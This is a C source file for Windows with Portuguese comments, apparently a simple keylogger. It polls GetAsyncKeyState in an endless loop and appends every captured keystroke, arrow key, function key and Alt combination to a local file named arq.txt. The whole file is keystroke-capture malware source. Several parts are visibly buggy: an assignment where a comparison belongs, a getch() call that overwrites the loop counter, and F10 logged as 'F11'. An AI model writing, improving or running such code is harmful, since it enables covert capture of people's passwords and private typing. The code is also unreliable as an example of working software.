#include<windows.h>
#include<stdio.h>
#include<stdlib.h>
#include<conio.h>
#include<string.h>
int chekEspecial1(FILE *arq, int tecla);
int main(){
	int teclas, resultado; //1º guarga a tecle digitada
	                      //2º guarda o resultado da verificaçao
	
	FILE *arq;
	
	arq = fopen("arq.txt", "w");
	fclose(arq);
	
	while(1){
		for(teclas=64; teclas<= 100; teclas++){
			Sleep(1);
			resultado = GetAsyncKeyState(teclas);
			
			if(resultado == -32767){
				arq = fopen("arq.txt", "a"); // fopen() funçao utilizada para abrir o arquivo
				fprintf(arq,"%c", teclas);
				fclose(arq);
				
			}
			else{
				int res;
				teclas = getch();
				res = chekEspecial1(arq,teclas); 
				if(res = 1){
					continue;
				}
			}
			
			
		}
	}
	
	                      
	return 0;
}

int chekEspecial1(FILE *arq, int tecla){ // se gravar no arquivo retorna 1
	int result = 1;
	printf("tecla = %d", tecla);
	arq = fopen("arq.txt","a");
		
	switch(tecla){
		case 71: // HOME
			fprintf(arq,"%s", "HOME ");
			break;
		case 72: //Seta para cima
			fprintf(arq,"%s", "SETA PARA CIMA ");
            break;
		case 73: // PAGE UP
			fprintf(arq,"%s", "PAGE UP ");
        	break;
    	case 75: //Seta para esquerda
    		fprintf(arq,"%s","SETA PARA ESQUERDA ");
            break;
		case 77: //Seta para direita
			fprintf(arq,"%s","SETA PARA A DIREITA");
            break;
        case 79: // END
        	fprintf(arq,"%s","END ");
            break;
        case 80: //Seta para baixo
        	fprintf(arq,"%s","SETA PARA BAIXO");
            break;
        case 81: // PAGE DOWN
        	fprintf(arq,"%s","PAGE DOWN ");
            break;
    	case 82: // INSERT
    		fprintf(arq,"%s","INSERT");
            break;
 		case 83: // DELETE
 			fprintf(arq,"%s","DELETE");
            break;
        case 59: // F1
        	fprintf(arq,"%s","F1 ");
            break;
        case 60: // F2
        	fprintf(arq,"%s","F2");
            break;
        case 61: // F3
        	fprintf(arq,"%s","F3");
            break;
        case 62: // F4
        	fprintf(arq,"%s","F4");
            break;
        case 63: // F5
        	fprintf(arq,"%s","F5");
            break;
        case 64: // F6
        	fprintf(arq,"%s","F6");
            break;
        case 65: // F7
        	fprintf(arq,"%s","F7");
            break;
        case 66: // F8
        	fprintf(arq,"%s","F8");
            break;
        case 67: // F9
        	fprintf(arq,"%s","F9");
            break;
        case 68: // F10
        	fprintf(arq,"%s","F11");
            break;
        case 104: // ALT + F1
        	fprintf(arq,"%s","ALT+F1");
            break;
        case 105: // ALT + F2
        	fprintf(arq,"%s","ALT+F2");
            break;
        case 106: // ALT + F3
        	fprintf(arq,"%s","ALT+F3");
            break;
        case 107: // ALT + F4
        	fprintf(arq,"%s","ALT+F4");
            break;
        case 108: // ALT + F5
        	fprintf(arq,"%s","ALT+F5");
            break;
        case 109: // ALT + F6
        	fprintf(arq,"%s","ALT+F6");
            break;
        case 110: // ALT + F7
        	fprintf(arq,"%s","ALT+F7");
            break;
        case 111: // ALT + F8
        	fprintf(arq,"%s","ALT+F8");
            break;
        case 112: // ALT + F9
        	fprintf(arq,"%s","ALT+F9");
            break;
        case 113: // ALT + F10
        	fprintf(arq,"%s","ALT+F10");
            break;		
		default:
    		result = 0; // SE NAO FOR ENCONTRADO NENHUMA DESSAS TECLAS RETORNASE 0 PARA A FUNÇÃO PRINCIPAL
    		break;
    	
	}
	fclose(arq); // FECHA O ARQUIVO APOS A GRAVAÇÃO!!
	return result;
	
}




















